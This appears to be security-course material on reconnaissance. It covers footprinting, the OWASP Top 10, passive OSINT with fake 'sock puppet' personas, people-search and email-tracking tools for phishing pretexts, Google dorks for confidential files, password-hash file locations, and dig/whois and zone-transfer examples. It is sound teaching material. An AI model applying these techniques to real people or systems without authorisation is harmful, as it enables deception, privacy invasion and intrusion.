Examples of Activities:
Internal network scans: You may use internal tools to scan your infrastructure for vulnerabilities.
Internal logs monitoring: Reviewing system logs or using SIEM to detect any suspicious activity within the network.
Assessing known assets: Checking for misconfigurations, weak access controls, or outdated systems that could be exploited by an attacker.
Goal: To secure the environment by identifying potential security flaws, detecting insider threats, and ensuring that no unauthorized activities are occurring in the friendly space.
Gray Space (Public Internet)

Definition: The Gray Space refers to the public internet or untrusted networks that exist outside of your control. This is where you will gather information that is publicly available, such as websites, DNS records, IP addresses, and other external-facing assets.
Role in Reconnaissance: In the Gray Space, you engage in open-source intelligence (OSINT) gathering and other forms of external reconnaissance. It's a space where both attackers and defenders operate to learn about target organizations, and it's the neutral ground between your controlled environment (Blue) and the potential adversary (Red).
Examples of Activities:
OSINT gathering: Collecting information from public sources like social media, WHOIS records, and company websites to understand your target.
Passive scanning: Identifying and mapping the organization's internet-facing assets like IP addresses, subdomains, and exposed services without interacting directly with the target systems.
Third-party services: Looking into security breaches, leak databases, or other third-party databases that might contain information about your target.
Goal: To gather public information and intelligence about your target or organization, but without interacting directly with the target in a way that could alert them to your activities. In this phase, the aim is to understand what's exposed to the outside world.
Red Space (Target Space)

Definition: The Red Space is the target network or adversarial environment. It is the environment that you, as the attacker (or ethical hacker), are trying to penetrate or gather intelligence on.
Role in Reconnaissance: When in the Red Space, you are operating with the intent to discover vulnerabilities, gather more detailed intelligence, or map out the target system's weaknesses. This space is where active penetration testing, scanning, and potentially exploiting vulnerabilities occurs.
Examples of Activities:
Active scanning: Using tools like Nmap or Nessus to actively scan a target for open ports, services, and vulnerabilities that could be exploited.
Service enumeration: Identifying which services (e.g., web servers, mail servers) are running on the target's network and gathering information about them to identify weaknesses.
Exploitation: Attempting to exploit discovered vulnerabilities (e.g., weak services, misconfigured systems) to gain unauthorized access.
Goal: To compromise the target network by identifying entry points, executing attacks, and potentially exfiltrating data, either for offensive purposes (as an attacker) or for ethical hacking purposes (as a penetration tester).


Resources


Instructor Note


6.3 Network Footprinting, Scanning, Enumeration, and Vulnerability Assessment¶
Network footprinting, scanning, enumeration, and Vulnerability Assessment are essential steps in the reconnaissance phase of a cybersecurity assessment or attack. Each step involves gathering information about a target network to understand its structure, devices, services, and potential vulnerabilities.



Resources


Instructor Note


6.3.1 Network Footprinting¶
Network footprinting involves gathering information about a target network's infrastructure, organization, and digital footprint. This information helps attackers or security professionals understand the scope and layout of the network.

This is the process of collecting information related to our target

Network - information related to the target network

DNS Domain Name
DNS Sub-domains
IP address blocks
Firewall/IDS/IPS discovery
External/Internal Websites
TCP/UDP services
VPN endpoints
Network Protocols
Systems - information related to the target system(s)

Hostname
IP/MAC address
User accounts
Group accounts
System Banners
Routing Tables
ARP Cache
SNMP data
Organization - information related to the target organization

Employees
Email addresses
Phone Numbers
Organization website
Security Policies
Org Charts


Resources


Instructor Note


6.3.2 Network Scanning¶
Scanning involves actively probing the target network to identify live hosts, open ports, and services running on those ports. This phase aims to discover potential entry points and vulnerabilities.

Port Scanning - open TCP/UDP ports and services

Network Scanning - Ip addresses, Operating systems, Network topology and Network devices

Vulnerability Scanning - scanning/detecting known vulnerabilities or weaknesses.



Resources


Instructor Note


6.3.3 Network Enumeration¶
Enumeration involves extracting more detailed information about the target network, such as user accounts, shares, applications, and configurations. This phase aims to gather as much information as possible to plan further attacks or security measures.

Types of information enumerated
Network Resource and shares
Users and Groups
Routing tables
Auditing and Service settings
Machine names
Applications and banners
SNMP and DNS details
Other common services and ports


Resources


Instructor Note


6.3.4 Vulnerability Assessment¶
Vulnerability assessment is a systematic process of identifying, quantifying, and prioritizing security vulnerabilities in a system, network, or application. It's a critical component of cybersecurity risk management and helps organizations understand their exposure to potential threats.

Process of indetifying vulnerabilities on a system, network or communication channels. Some of the top 10 vulnerabilities according to Open Web Application Security Project (OWASP) to look for are:

A01: Broken Access Control

Description: Improper implementation of access control can result in unauthorized data viewing, modification, or deletion.
Example: A user can access another user's account information by manipulating URL parameters.
Prevention:
Implement strong authorization mechanisms.
Enforce least privilege principles.
Regularly review and update access controls.
A02: Cryptographic Failures

Description: Weakly configured or poorly implemented cryptography can lead to data breaches.
Example: A web application uses a weak encryption algorithm for transmitting sensitive data, making it susceptible to eavesdropping.
Prevention:
Use strong cryptographic algorithms and protocols.
Protect cryptographic keys securely.
Regularly review and update cryptographic implementations.
A03: Injection

Description: Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.
Example: A user can inject malicious SQL code into an input field to access or modify database content (SQL injection).
Prevention:
Input validation and sanitization.
Prepared statements or parameterized queries.
Output encoding.
A04: Insecure Design

Description: Weak security requirements as part of the software development lifecycle can lead to system failures.
Example: A web application exposes sensitive data in error messages, allowing attackers to gather information for further attacks.
Prevention:
Threat modeling and risk assessment.
Secure by design principles.
Security code reviews.
A05: Security Misconfiguration

Description: Improper security configurations in software, frameworks, and hardware can lead to information disclosure, takeover, or data loss.
Example: A web server is configured with default credentials, allowing unauthorized access.
Prevention:
Follow security best practices for configurations.
Use security configuration checklists.
Regularly review and update configurations.
A06: Vulnerable and Outdated Components

Description: Using components with known vulnerabilities can lead to exploitation.
Example: A web application uses an outdated version of a popular library with known vulnerabilities, leading to a successful exploit.
Prevention:
Maintain up-to-date component inventories.
Regularly check for vulnerabilities.
Implement a patch management process.
A07: Identification and Authentication Failures

Description: Improper implementation of identification and authentication functions can allow attackers to compromise accounts.
Example: A web application allows weak passwords or lacks proper session management, enabling account takeover.
Prevention:
Strong password policies and multi-factor authentication.
Secure session management.
Protect authentication data.
A08: Software and Data Integrity Failures

Description: Failures in software and data integrity can result in unexpected behavior, data corruption, or denial of service.
Example: A web application fails to verify the integrity of uploaded files, allowing attackers to inject malicious code.
Prevention:
Code signing and verification.
Data integrity checks.
Secure software updates.
A09: Security Logging and Monitoring Failures

Description: Insufficient logging and monitoring can increase the time to identify and respond to incidents.
Example: A web application lacks adequate logging, making it difficult to detect and respond to security incidents.
Prevention:
Comprehensive logging and monitoring.
Real-time threat detection.
Incident response plan.
A10: Server-Side Request Forgery (SSRF)

Description: Improper handling of user-supplied input can lead to an attacker accessing internal systems through the application.
Example: A web application allows users to specify arbitrary URLs, enabling attackers to access internal systems through the application.
Prevention:
Input validation and sanitization.
Restrict allowed hosts and ports.
Avoid exposing internal systems to untrusted input.


Resources


Instructor Note


6.4 Describe Methods Used for Passive External Discovery¶




Passive host and service discovery is much less straight forward and requires more time than active discovery methods, but it carries less risk of discovery by administrators and Network System Monitoring "NSM" (IPS/IDS). Passive approaches require knowledge of particular systems, their nuances, and how they generate network traffic. In general, the passive reconnaissance approach can be categorized as attempted gathering of information about a target network or host without direct interaction.

Network owners must understand what information can be gleaned from their network traffic and have a full understanding of their network footprint. Information can be gathered from a target passively by eavesdropping on a target using tools such as Wireshark, tcpdump, and tshark.

Performing passive reconnaissance typically involves identifying key topics across several specific areas. To maintain anonymity and avoid revealing our true identities during this process, it is essential to operate under a credible and realistic false persona. This is achieved through the creation and use of a well-crafted 'sock puppet' - a fictitious online identity designed to blend seamlessly into the digital environment - while ensuring operational security.

Creating a Sock Puppet

An OSINT sock puppet is a fabricated online persona designed specifically for conducting Open-Source Intelligence (OSINT) investigations discreetly. It is used to gather publicly available information or interact with individuals, groups, or communities without revealing the operator's true identity. These accounts are carefully crafted to appear authentic and avoid suspicion.

Characteristics of an OSINT Sock Puppet:

Detailed Persona:

Includes a realistic name, date of birth, gender, and location. (https://www.fakenamegenerator.com)
A consistent background story that aligns with the account's activity and purpose.
Visual Identity:

A profile picture that looks authentic but isn't tied to a real person. Tools like AI-generated images (e.g., from platforms like https://www.thispersondoesnotexist.com) are often used.
Posts include real-looking images (e.g., landscapes, objects) rather than personal photos.
Digital Presence:

Active and believable engagement across multiple platforms (e.g., Twitter, Facebook, LinkedIn, Instagram).
Posts reflect normal online behavior, such as sharing news, memes, or personal interests.
Engagement and Relationships:

Follows other accounts, joins groups, or participates in discussions relevant to the investigation.
May develop relationships with targets to gain trust and access information.
Operational Security (OPSEC):

Avoids linking back to the operator's real identity (e.g., using a VPN, separate devices, or virtual machines).
The account does not use names, images, or content that could compromise the operator.
Regularly updated to prevent being flagged as inactive or fake.
Specialized Purpose:

Targeted to a specific community, language, or interest group based on the investigation's goals.
Examples include engaging with extremist forums, monitoring corporate competitors, or researching disinformation campaigns.
Ethical and Legal Considerations:

Using sock puppets raises ethical questions and legal risks, particularly when engaging with individuals or groups under false pretenses. Organizations conducting OSINT often follow strict guidelines to ensure compliance with laws and avoid manipulation or misuse of data.


Resources


Instructor Note


6.4.1 Passive Recon Activities¶
Passive reconnaissance, commonly known as "passive recon" or "passive information gathering," entails the collection of information about a target without direct engagement with its systems. The objective is to quietly acquire data without triggering any alerts from the target. Open source intelligence (OSIT) gathering is most commonly used in this phase. This phase is crucial in cybersecurity assessments, ethical hacking, and penetration testing processes. A cornerstone of OSINT is collecting Publicly Available Information (PAI).

Open-Source Intelligence (OSINT) - Is the process of collecting and analyzing publicly available information to produce actionable intelligence.

Publicly Available Information (PAI) - Is any data that is accessible to the general public. It's a broad term encompassing a wide range of information found in various public sources.

PAI sources can be divided up into different categories of information flow:

Offline:

Traditional Media: Newspapers, magazines, television, and radio broadcasts.
Public Records: Government offices maintain records like birth, death, marriage, property, and court records.
Libraries: Physical and digital collections of books, articles, and research materials.
Public Events: Conferences, speeches, and demonstrations can provide valuable insights.
Online (Internet):

Social Media: Platforms like Facebook, Twitter, Instagram, LinkedIn, TikTok, etc., offer a wealth of user-generated content.
Search Engines: Google, Bing, and other search engines provide access to billions of web pages.
News Websites and Blogs: Online publications offer news, opinion, and analysis.
Government Websites: Government agencies publish data, reports, and regulations.
Company Websites: Corporate information, press releases, and investor relations materials.
Online Forums and Communities: Platforms like Reddit, Quora, and specialized forums offer discussions and information sharing.
Video and Image Sharing: Sites like YouTube, Flickr, and others host multimedia content.
Image-sharing platforms (Google Images, Flickr, etc.)
Open Data Portals: Government and non-profit organizations often release datasets for public use.
The Deep Web and Dark Web: While more challenging to access, these can contain valuable information, but proceed with caution.
Public Data:

Government agencies (birth, death, marriage records, property records, etc.)
Public government reports, budgets, hearings, telephone directories, press conferences, websites, and speeches. Although this source comes from an official source they are publicly accessible and may be used openly and freely.
Professional and Academic Publications, information acquired from journals, conferences, symposia, academic papers, dissertations, and theses.
Commercial Data:

Market research reports: Published findings can provide insights into consumer behavior, market trends, and industry performance.
Economic indicators: GDP, inflation rates, unemployment figures, and other economic data are widely available.
Weather data: Commercial weather services provide publicly accessible forecasts and historical data.
Satellite imagery: Commercial satellite companies offer imagery that can be used for various purposes.
Grey literature:

Government reports on economic indicators, population trends, or environmental impact assessments.
Industry whitepapers on market analysis, technology trends, or best practices.
Think tank reports on policy recommendations and social issues.
Conference proceedings with research findings and industry insights.
Technical reports, preprints, patents, working papers, business documents, unpublished works, and newsletters.


Resources


Instructor Note


6.4.1.1 IP Addresses and Sub-domains¶
Usually one of the first steps in passive reconnaissance, it's important to identify the net ranges and sub-domains associated with your target(s) as this will help scope the remainder of your activities.

Use passive tools to collect the target's owned IP address blocks

IANA or one of their IRR's
IPV4 Address Space
IPV6 Unicast Address Assignments
IPinfo.io
Collect all the DNS domain and sub-domain names.

dig - Queries the DNS server over UDP port 53. You can pull various DNS records registered on the DNS server.
whois - Queries the DNS Registrar over TCP port 43.
A domain name registrar is a business that handles the reservation of domain names as well as the assignment of IP addresses for those domain names. A domain name registrar is a business that handles the reservation of domain names as well as the assignment of IP addresses for those domain names.
search.arin.net/rdap
whois.domaintools.com
viewdns.info
dnsdumpster.com
www.domainiq.com
viz.greynoise.io
search.censys.io
fullhunt.io
centralops.net/co
ipapi.is
ip-netblocks.whoisxmlapi.com/lookup
URL Scan:

Netcraft
urlscan.io
fofa.info
web-check.xyz
web-check.as93.net
Tools:

Fierce - is an IP and DNS recon tool is written in PERL, famous for helping IT sec professionals to find target IPs associated with domain names.
Unicornscan - is one of the top intel-gathering tools for security research. It has also a built-in correlation engine that aims to be efficient, flexible and scalable at the same time.
IP GeoLocation lookup:

www.maxmind.com/en/locate-my-ip-address
iplocation.io
www.iplocation.net/ip-lookup
infosniper.net
db-ip.com
Trace the IP route to the target using:

Traceroute (using TCP, UDP or ICMP)
visualtraceroute.net
www.visualroute.com
BGP advertized prefixes

bgpview.io
hackertarget.com/as-ip-lookup
bgp.he.net
www.bgp4.as/tools
Wireless Networks

wigle.net
www.wifimap.io


Resources


Instructor Note


6.4.1.2 Identifying External/3rd Party sites¶
This is not typically in the scope for penetration testing but should not be overlooked as advesaries can (and do) expoit this.
This involves external companies that support or collaborate with your target. These may have softer security.
Target's competitors may have details about your target that they collected for themselves.
Look for potential Supply Chain Attack


Resources


Instructor Note


6.4.1.3 Identifying People¶
Identifying names, email addresses, phone numbers, and other personal information can be valuable for pretexting, phishing or other social engineering activities. Use open-source to collect information on subject browse social media sites:

Company website (example: link:www.ccboe.net[www.ccboe.net])
Third-party data repositories (companies that host data for your targeted organization)

Tools such as:

Maltego - provides the ability to lookup email addresses based on a given domain.
Recon-ng - built in the Kali Linux distribution to perform reconnaissance on remote targets.
theHarvester - fetch valuable information about any subdomain names, virtual hosts, open ports and email address of any company/website.
Jigsaw - gather information about any company employees. For companies like Google, Linkedin, or Microsoft, where you can just pick up one of their domain names (like google.com), and then gather all their employee's emails on the different company departments.
SpiderFoot - automate OSINT and have fast results for reconnaissance, threat intelligence, and perimeter monitoring.
Creepy - geo-location OSINT tool for infosec professionals. It offers the ability to get full geolocation data from any individuals by querying social networking platforms like Twitter, Flickr, Facebook, etc.
Message boards:

User Forums:

www.mirc.com
discord.com
www.reddit.com
Search Engines:

www.google.com
www.bing.com
www.yahoo.com
duckduckgo.com
www.ask.com
search.brave.com
www.search.com
info.com - Meta Search engine (Google, Yahoo!, Ask, Bing, Yandex, Open Directory)
www.baidu.com - China
soso.com - China
www.sogou.com - China
www.petalsearch.com - China (huawei)
yandex.com - Russian
www.ecosia.org - environment-friendly search engine
www.naver.com - South Korean
www.seznam.cz - Czech Republic
www.mojeek.com - UK
www.qwant.com - France
swisscows.com - Switzerland
metager.org - Germany
www.qwant.com - European Union
qmamu.com - India
halalgoogling.com - Islamic
www.egerin.com - Kurdish
www.alleba.com - Philippines
www.eniro.se - Sweeden
www.goo.ne.jp - Japan
www.najdi.si - Slovenia
www.onet.pl - Poland
www.orange.fr/portail - France
www.parseek.com - Iran
www.sapo.pt - Portugal
search.ch - Switzerland
www.walla.co.il - Israel
www.najdi.si - Slovenia
Specialty Search Engines:

www.iseek.com/#/web
www.2lingual.com - Searching in 2 Languages
www.criminalip.io - Cyber Threat Intelligence Search Engine and Attack Surface Management (ASM) platform.
bevigil.com/search - Search for assets like Subdomains, URLs, Parameters in mobile applications
Social Media:

www.facebook.com
www.whatsapp.com
www.instagram.com
www.tumblr.com
www.tiktok.com
X - formerly "Twitter"
www.reddit.com
www.linkedin.com
www.pinterest.com
www.quora.com
www.viber.com
www.snapchat.com
telegram.org
vk.com - Russian
ok.ru - Russian
www.wechat.com - China
www.imqq.com - China
qzone.qq.com - China
www.weibo.com - China
tieba.baidu.com - China
www.renren.com - China
www.kakaocorp.com - South Korea
cafe.naver.com - South Korea
mixi.jp - Japan
Job Portals (To find job titles):

www.monster.com
www.linkedin.com
www.glassdoor.com
www.indeed.com
Document and File Metadata Search and Tools:

www.filechef.com
www.filesearch.link - File Search Engine
www.dedigger.com - Find public files in Google Drive
filepursuit.com - Search the web for files, videos, audios, eBooks & much more.
www.searchftps.net - Search and download files located on public FTP servers.
Whois records

lookup.icann.org/en
who.is
www.whois.com/whois
whois.domaintools.com
www.godaddy.com/whois
mxtoolbox.com/whois.aspx
www.domain.com/whois/whois
Family Tree:

Ancestry.com
FamilyTree.com
Family Search
Family Tree DNA
Email Tracking: (Hidden Images, Link Redirection) - who is checking emails

YesWare
HubSpot
Staff Base
GetNotify
ReadNotify
WhoReadMe
DidTheyReadIt
Social Engineering Toolkit (SET)
Other people "look-up" pages:

www.fastpeoplesearch.com
usersearch.org/index.php
instantusername.com
com.lullar.com
www.truepeoplesearch.com
www.peekyou.com
haveibeenpwned.com
www.beenverified.com
checkusernames.com
knowem.com
www.zabasearch.com
www.whitepages.com


Resources


Instructor Note


6.4.1.4 Identifying Technologies¶
Identifying the types and versions of the systems and software applications in use by an organization is an important precursor to identifying potential vulnerabilities. You can ID technologies from many sources including:

File extensions list - many are specific to certain applications' operating systems

Server responses - Various tools can identify specific signatures in network traffic.

MAC OUI lookups:

www.macvendorlookup.com
dnschecker.org/mac-lookup.php
macaddress.io
maclookup.app
Job postings/interviews

www.monster.com
www.linkedin.com
www.glassdoor.com
www.indeed.com
Directory listings on the target webpage

Login splash pages

Website content

X-Powered-By
Builtwith identifies technologies webisites were built with.
Wappalyzer determines technology as you browse the website.
Pentest-Tools Website Recon
Content-Types

Server Software and Version
Cookie Information
Builtwith - detect which technologies are used on any website on the internet.
Tools:
wget
HTTrack
Pavu
WebRipper 2.0 www.calluna-software.com
WinWSD
DomainPunch
WebExtractor
Public acquisition records

Shodan.io

Spyse - is another OSINT search engine that lets anyone grab critical information about any website in the world. Quite simply, Spyse is an infosec crawler that gets useful information for red and blue teams during the reconnaissance process.

Document Searches

Google Hacking Database

dorksearch.com
Google dork cheatsheet

site:

site:.gov "Secret"
site:linkedin.com intitle:starbucks "network engineer"
intitle:

intitle:"Welcome to Windows 2000 Internet Services"
intitle:"Nessus Scan Report" "This file was generated by Nessus"
intitle:"index of" inurl:ftp
inurl:

inurl:admin/login
inurl:/admin.html
filetype:

filetype:pdf "Confidential"
filetype:ppt "Networking"
System fingerprinting tools:

Ettercap - passive TCP/IP stack fingerprinting.
NetworkMiner - passive DHCP and TCP/IP stack fingerprinting (combines p0f, Ettercap and Satori databases)
p0f - comprehensive passive TCP/IP stack fingerprinting.
NetSleuth - free passive fingerprinting and analysis tool
PacketFence - open source NAC with passive DHCP fingerprinting.
PRADS - Passive Real-time Asset Detection System. Passive comprehensive TCP/IP stack fingerprinting and service detection
Satori - passive CDP, DHCP, ICMP, HPSP, HTTP, TCP/IP and other stack fingerprinting.
SinFP - single-port active/passive fingerprinting.
XProbe2 - active TCP/IP stack fingerprinting.
Device Fingerprint Website - Displays the passive TCP SYN fingerprint of your browser's computer (or intermediate proxy)
File Metadata Tools:

FOCA
metagoofil
EXIF Tool
File Explorer (Windows)
Finder (macOS)


Resources


Instructor Note


6.4.1.5 Identifying Content of Interest¶
Identifying web and email portals, log files, backup or archived files, or sensitive information contained within HTML comments or client-side scripts is important for vulnerability discovery and future penetration testing activities.

Site content can reveal potential access points (e.g. web portals), sensitive data (login credentials), and more. As you browse the site be on the lookout for the following:
Externally facing web portals, webmail, and administrative consoles - As you navigate the site, you will want to take note of any interesting functionality that could prove useful for future penetration testing activities such as externally-facing web portals, email services, or administrative consoles. It's possible you might come across these as you browse but you may also want to look for them with targeted Google searches.
Test pages - Be on the lookout for test infrastructure as well. Often test pages have fewer security controls or robust error messages when compared to their production counterparts, yet they frequently reside on (and provide access to) the same production infrastructure.
Log files - Log files are sometimes left exposed and publicly accessible via Google search results. Logs can contain everything from robust errors to configuration data, IP addresses, usernames and even clear text passwords
Backup files - Sometimes web admins retain old, possibly vulnerable versions of website pages or text versions of server-side code (php, asp, etc) that can be downloaded and reviewed offline.
Configuration files - Configuration files can contain sensitive connection strings, passwords, IP addresses and other valuable information.
Database dump files - Similar to configuration files, database dump files can contain sensitive information such as table structures and queries (for use in SQL injection testing), names, email addresses, usernames, and passwords. Searching for filetypes of sql, dbf, mdf, dat, or mdb (among others) can uncover these files.
Client-side code - Review of client-side HTML and scripts can reveal sensitive data or even vulnerabilities such as unsafe handling of user-provided data. BurpSuite Pro has an engagement tool called "Find Scripts" which will search the specified hosts(s) in your site map and extract content for review.
/etc/passwd and /etc/shadow or SAM database
Windows usually stores passwords in these locations:
Security Accounts Manager (SAM) database (C:\WINDOWS\system32\config) or (HKEY_LOCAL_MACHINE\SAM)
SAM file is not accessible while the OS is running. Use an external bootable CD or USB.
Active Directory database file that's stored locally or spread across domain controllers (ntds.dit)
hashes passwords with NTLM
Linux and other UNIX variants typically store passwords in these files:
/etc/passwd (readable by everyone) - Contains the usernames
/etc/shadow (accessible by the system and the root account only) - Contains the passwords.
/etc/security/passwd (accessible by the system and the root account only)
/.secure/etc/passwd (accessible by the system and the root account only)
hashes passwords with:
$1 = MD5
$2 =Blowfish
$2a =eksblowfish
$5 =SHA-256
$6 =SHA-512


Resources


Instructor Note


6.4.1.6 Identifying Vulnerabilities¶
It's possible to identify critical vulnerabilities that can be exploited with further active penetration testing activities solely by examining publicly available information

Vulnerability Focus:
Network
OS
Applications
Service
Configuration Errors
OS Fingerprinting
p0f p0f
Ettercap Ettercap
The following are some of the methods you might use to identify vulnerabilities:
Researching known software vulnerabilities based on identified technologies
Examining URLs - the url may indicate what is used to host webpage.
.aspx may mean SharePoint
ASP.NET may indicate a Microsoft IIS
Passive scanning via an intercepting proxy
Shrink-wrap code - an act of exploiting holes in unpatched or poorly configured software.
Reviewing error messages
ICMP
HTTP(s) status codes
Tools:
Saint
Linux or Mac
Identifies Vulnerabilities on:
Network devices
Operation systems
Desktop Apps
Web Apps
Databases
Nessus
Linux, Windows and Mac
Malware/Botnet detection
GFI LanGuard
Patch Management
Vulnerability Assesment
Network Auditing
Change Management
Inventory Management
Shadow Security Scanner
Core Impact
Qualys
OvenVAS
Retina CS
NextPost
Wapiti
MetaSploit
Network enumeration and discovery
Evade detection on remote hosts
Exploit development and execution
Work with the MFSconsole
Scan remote targets
Exploit vulnerabilities and collect valuable data
OvenVAS Open Vulnerability Assessment System
Simultaneous host discovery
Network mapper and port scanner
Fully integrated with SQL Databases like SQLite
Full support for Linux and Windows
Burp Suite Scanner (https://portswigger.net/burp)
Web Vulnerability scanner
Nikto (https://cirt.net/Nikto2)
Scans multiple ports on a server
IDS evasion techniques
Apache and cgiwrap username enumeration
Identifies installed software via headers, favicons and files
Scans specified CGI directories
WPScan (https://wpscan.com/wordpress-security-scanner)
Non-intrusive security scans
WP username enumeration
WP bruteforce attack & weak password cracking
WP plugins vulnerability enumeration
Schedule WordPress security scans
Web SSL Certificates
https://www.digicert.com
https://www.ssllabs.com
https://www.sslshopper.com
Vulnerability databases
NIST: NIST
CVE: CVE
Rapid 7: Rapid 7
Mitre Vulnerability Database: Mitre Vulnerability Database
Open Source Vulnerability Database: Open Source Vulnerability Database


Resources
Passive Reconnaissance


Instructor Note


6.4.1.6.1 Compliance Auditing¶
Compliance auditing is a systematic examination wherein an organization's conformity to regulatory guidelines, industry standards, and internal policies is scrutinized and assessed. The main objective is to verify that the organization is conducting its operations in alignment with relevant laws, regulations, and established protocols. The purpose of conducting compliance audits is to pinpoint any variances from the specified standards and initiate corrective measures when deemed necessary.

Compliance auditing standards refer to the established criteria and guidelines that organizations follow when conducting audits to assess their adherence to regulatory requirements, industry standards, and internal policies. These standards provide a framework for conducting thorough and effective compliance audits.

PCI DSS - Payment Card Industry Data Security Standard (PCI DSS) compliance is designed to protect businesses and their customers against payment card theft and fraud. If your business accepts, stores, or transmits card data, PCI DSS compliance validation is required by card brands such as Visa, MasterCard and Discover.

NERC - The North American Electric Reliability Corporation (NERC) Critical Infrastructure Protection (CIP) exists to improve the reliability of the critical bulk power SCADA systems that create and transport electricity around the continent, and the goal of a NERC compliance program is to ensure that the bulk electric system in North America is reliable, adequate and secure. It's not enough to just plan for natural disasters or accidents-the bulk power system now must be planned, designed, built and operated in a manner that also takes into account modern threats to security, including attacks from cyber criminals. NERC compliance programs are required to help prevent these attacks.

FISMA - The Federal Information Security Management Act (FISMA) requires Federal agencies to develop, document, and implement an information security program to safeguard their systems and data. In addition to government agencies, FISMA also applies to contractors and third parties that use or operate an information system on behalf of a Federal agency.

SOX - Sarbanes-Oxley Act (SOX) requires that publicly-traded companies ensure their internal business processes are properly monitored and managed. Financial reporting processes are driven by IT systems, so IT needs to be configured securely and maintained properly. The Securities and Exchange Commission (SEC) has identified five areas that need to be addressed to meet SOX internal control requirements and support SOX compliance, two of which are risk assessment and monitoring.

GLBA - The Gramm-Leach-Bliley Act is a U.S. federal law created to control how financial institutions deal with a consumer's non-public personal information (NPI). This is information that a financial institution collects when providing a financial product or service that can identify an individual and that isn't otherwise publicly available.

The Act has three main elements:
The Privacy Rule, which regulates the collection and use of NPI
The Safeguards Rule, which requires financial institutions to implement a security program to protect NPI
Pretexting provisions, which prohibits access to NPI under false pretense
HIPAA - The Health Insurance Portability and Accountability Act (HIPAA) protects the privacy and security of personal health information (PHI). Any healthcare organization that stores, processes, or transmits PHI must meet HIPAA compliance requirements, including any business associates that perform functions or provide services on their behalf.

GDPR - The General Data Protection Regulation (GDPR compliance) protects the personal data of EU citizens regardless of the geographical location of the organization or the data. Organizations around the world must be compliant with GDPR by 25th May 2018. Changes to people, processes, and technology are required to ensure that personal data is correctly controlled, processed, maintained, retained, and secured. Penalties for infringement of the General Data Protection Regulation can be up to $20,000,000 or 4% of worldwide annual turnover, whichever is the greater amount.

CIS Benchmarks - The Center of Internet Security (CIS) is a non-for-profit organization that develops their own Configuration Policy Benchmarks, or CIS benchmarks, that allow organizations to improve their security and compliance programs and posture. This initiative aims to create community developed security configuration baselines, or CIS benchmarks, for IT and Security products that are commonly found throughout organizations.

SCAP - The Security Content Automation Protocol (SCAP) is a method that uses open standards to organize and express security-related information. It's not a regulation or a mandate, but it allows federal agencies to automate a great deal of manual processes and make data standardization and comparisons a lot easier.

FDCC - The Federal Desktop Core Configuration (FDCC compliance) is an older federal standard that defines a standardized desktop configuration to improve security. Although FDCC benchmarks have been superseded by USGCB benchmarks in 2010 and 2011, many agencies are still working on their FDCC compliance. If you're one of them, we can help you achieve FDCC compliance.

USGCB - The United States Government Configuration Baseline (USGCB) is a United States government-wide initiative that guides federal agencies on what they can do to improve and maintain effective configuration settings focusing primarily on security. This initiative aims to create security configuration baselines for IT and security products, specifically on desktops and laptops, deployed across federal agencies. While it's not a standalone regulation like FISMA, USGCB compliance is a core requirement of FISMA.



Resources


Instructor Note


6.4.2 Dig, Whois and Other Tools¶
DNS is critical to the operation of the Internet for resolving hostnames to IP addresses. Therefore, DNS servers contain vast amounts of data that can be used to gain information.



Resources


Instructor Note


6.4.2.1 Whois¶
WHOIS

RFC 3912 TCP-based transaction-oriented query/response protocol that is widely used to provide information services to Internet users. While originally used to provide "white pages" services and information about registered domain names, current deployments cover a much broader range of information services. The protocol delivers its content in a human-readable format.

The WHOIS lookup helps determine where the site is hosted, who owns the IP block, and may list organizational contacts that may be useful for social engineering.

WHOIS works by querying DNS registrars databases over TCP port 43.

A domain name registrar is a business that handles the reservation of domain names as well as the assignment of IP addresses for those domain names. Examples of Domain Registrars are:

Domain.com
Bluehost
Network Solutions
HostGator
GoDaddy
NameCheap
DreamHost
BuyDomains
Most whois queries will return false information as most people opt for privacy of their domain information in order to protect against email harvesting, spam, and social engineering attempts on the administrative contact.


instructor@net1:~$ whois ccboe.net
whois



Resources
RFC 3912
whois readme
What is a domain name registrar
Domain name registrar wiki
Beginner's Guide-how to choose the best domain registrar


Instructor Note


6.4.2.2 DIG¶
Dig is a tool that returns key DNS information and can be used to query for specific records.


instructor@net1:~$ dig ccboe.net
instructor@net1:~$ dig ccboe.net MX
instructor@net1:~$ dig ccboe.net SOA
instructor@net1:~$ dig ccboe.net TXT




This method can be further enhanced with tools such as dnsrecon that will brute-force with a word-list to find hidden sub-domains using words such as sales, training, admin, etc. This method is considered semi-active, generating logs for unlisted sub-domains would look quite suspicious.



Resources


Instructor Note


6.4.2.3 Zone Transfers¶
A zone transfer is typical between primary and secondary DNS servers to update records on a domain. This information, if allowed to be transferred externally through misconfiguration, allows hostnames, IP's, and IP blocks to be discovered. With this information, targets can be determined with information for possible social engineering.


instructor@net1:~$ dig axfr @nsztm1.digi.ninja zonetransfer.me
zonetransfer

DigiNinja's Zone Transfer Me


Resources


Instructor Note

instructor@net1:~$ dig axfr @nsztm1.digi.ninja zonetransfer.me
* This zone transfer includes tons of information, the website will guide you along and you may format questions based on what you see. * What sub-domains have been found? * What mail servers are being used? * Can you determine location with the LOC file?


6.4.3 Netcraft¶
Netcraft.com can also be used to find extra information about a url, including the netblock owners and hosting history. The date first seen is December 1996 for "www.ccboe.net". Combine this with sites such as the wayback machine and see what you can come up with.

The key takeaway is that the traffic generated looks like normal DNS queries and the target is none the wiser that they are being probed for information. For further non attribution, use a third party web-site such as dns stuff or central ops to perform the queries.



Resources


Instructor Note


6.4.4 Collect Historical Content¶
Organizations often change their associated websites over time. As more emphasis is placed on security, these organizations have made more and more of their information private over time. A company may have posted their organizational charts, contact information for important people and even device type specifics on their websites in the past. There are many organizations that take snapshots of pages over time and archive these results. The Wayback Machine is the most popular example of this and can be a useful tool if you are looking for information you know was hosted in the past, but is not available now.

Using the Wayback Machine, you can:

Track website changes: Search for the company's domain on the Wayback Machine. This will show you archived versions of the website over time. You can identify changes in website content, design, or domain ownership. For instance, if the company used to have a different name or was involved in different activities, this information might be revealed in older versions of the website.
Discover removed content: Sometimes, companies delete information from their websites to cover their tracks. The Wayback Machine can uncover this deleted content, providing valuable clues.
Identify past associates: If the company has changed its leadership or partnerships, the Wayback Machine can help identify previous associates who might be relevant to your investigation.
Uncover hidden information: Wayback Machine can sometimes reveal information that is no longer publicly accessible, such as contact details, addresses, or financial information.
Identify the Target Website:

Assume you are researching the company "ExampleCorp" and its website is www.examplecorp.com.
Access the Wayback Machine:

Go to the Wayback Machine at http://archive.org/web
Enter the Website URL:

In the search bar, enter the URL of the company's website: www.examplecorp.com, and click on "Browse History".
Explore the Archive Calendar:

You will see a timeline and a calendar view showing dates when snapshots of the website were taken. The calendar highlights dates with available snapshots.
